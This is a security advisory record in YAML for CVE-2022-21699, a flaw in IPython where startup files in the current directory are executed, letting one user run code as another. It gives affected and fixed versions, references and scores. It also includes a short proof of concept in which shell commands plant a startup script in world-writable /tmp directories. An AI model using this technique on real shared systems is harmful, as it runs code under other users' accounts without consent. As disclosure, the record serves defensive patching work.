---
identifier: "CVE-2022-21699"
identifiers:
- "CVE-2022-21699"
- "GHSA-pq7m-3gw7-gq5x"
package_slug: "pypi/ipython"
title: "Execution with Unnecessary Privileges in ipython"
description: "Weâ€™d like to disclose an arbitrary code execution vulnerability in IPython
  that stems from IPython executing untrusted files in CWD. This vulnerability allows
  one user to run code as another.\n\nProof of concept\n\nUser1:\n```\nmkdir -m 777
  /tmp/profile_default\nmkdir -m 777 /tmp/profile_default/startup\necho 'print(\"stealing
  your private secrets\")' > /tmp/profile_default/startup/foo.py\n```\n\nUser2:\n```\ncd
  /tmp\nipython\n```\n\n\n\nUser2 will see:\n```\nPython 3.9.7 (default, Oct 25 2021,
  01:04:21)\nType 'copyright', 'credits' or 'license' for more information\nIPython
  7.29.0 -- An enhanced Interactive Python. Type '?' for help.\nstealing your private
  secrets\n```"
date: "2024-09-27"
pubdate: "2022-01-21"
affected_range: "<5.11||>=6.0.0,<7.16.3||>=7.17.0,<7.31.1||>=8.0.0,<8.0.1"
fixed_versions:
- "5.11"
- "7.16.3"
- "7.31.1"
- "8.0.1"
affected_versions: "All versions before 5.11, all versions starting from 6.0.0 before
  7.16.3, all versions starting from 7.17.0 before 7.31.1, all versions starting from
  8.0.0 before 8.0.1"
not_impacted: "All versions starting from 5.11 before 6.0.0, all versions starting
  from 7.16.3 before 7.17.0, all versions starting from 7.31.1 before 8.0.0, all versions
  starting from 8.0.1"
solution: "Upgrade to versions 5.11, 7.16.3, 7.31.1, 8.0.1 or above."
urls:
- "https://nvd.nist.gov/vuln/detail/CVE-2022-21699"
- "https://github.com/advisories/GHSA-pq7m-3gw7-gq5x"
- "https://github.com/ipython/ipython/security/advisories/GHSA-pq7m-3gw7-gq5x"
- "https://github.com/ipython/ipython/commit/46a51ed69cdf41b4333943d9ceeb945c4ede5668"
- "https://github.com/ipython/ipython/commit/5fa1e409d2dc126c456510c16ece18e08b524e5b"
- "https://github.com/ipython/ipython/commit/67ca2b3aa9039438e6f80e3fccca556f26100b4d"
- "https://github.com/ipython/ipython/commit/a06ca837273271b4acb82c29be97c0b6d12a30ea"
- "https://github.com/ipython/ipython"
- "https://github.com/pypa/advisory-database/tree/main/vulns/ipython/PYSEC-2022-12.yaml"
- "https://ipython.readthedocs.io/en/stable/whatsnew/version8.html#ipython-8-0-1-cve-2022-21699"
- "https://lists.debian.org/debian-lts-announce/2022/01/msg00021.html"
- "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/CRQRTWHYXMLDJ572VGVUZMUPEOTPM3KB"
- "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/DZ7LVZBB4D7KVSFNEQUBEHFO3JW6D2ZK"
cvss_v2: "AV:L/AC:L/Au:N/C:P/I:P/A:P"
cvss_v3: "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H"
uuid: "b4534551-5fba-4bec-abaa-e8390e815a96"
cwe_ids:
- "CWE-250"
- "CWE-269"
- "CWE-279"
- "CWE-937"
- "CWE-1035"
